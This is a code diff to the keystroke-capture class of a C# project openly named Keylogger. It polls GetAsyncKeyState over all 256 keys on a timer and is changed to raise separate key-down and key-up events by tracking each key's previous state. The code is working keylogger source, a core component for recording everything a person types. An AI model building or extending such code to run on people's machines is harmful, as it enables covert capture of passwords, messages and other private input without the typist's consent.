@@ -31,9 +31,16 @@ namespace Keylogger
         public bool IsActive { get => timer.Enabled; }
 
         public delegate void KeyHandler(Keys key);
-        public event KeyHandler KeyPressed;
+        public event KeyHandler KeyDown;
+        public event KeyHandler KeyUp;
+        Dictionary<int, bool> prevStatus;
         public Catcher(int delay)
         {
+            prevStatus = new Dictionary<int, bool>();
+            for (int i = 0; i < 256; i++)
+            {
+                prevStatus.Add(i, false);
+            }
             timer = new System.Timers.Timer(delay);
             Delay = delay;
             timer.Elapsed += CheckKeys;
@@ -53,14 +60,18 @@ namespace Keylogger
         }
         public void CheckKeys(Object source, ElapsedEventArgs e)
         {
-            for (int i = 0; i < 255; i++)
+            for (int i = 0; i < 256; i++)
             {
                 int responce = GetAsyncKeyState(i);
                 if (responce == 32769)
                 {
-                    Keys key = (Keys)i;
-
-                    KeyPressed(key);
+                    prevStatus[i] = true;
+                    KeyDown((Keys)i);
+                }
+                else if(responce == 0 && prevStatus[i])
+                {
+                    prevStatus[i] = false;
+                    KeyUp((Keys)i);
                 }
             }
         }
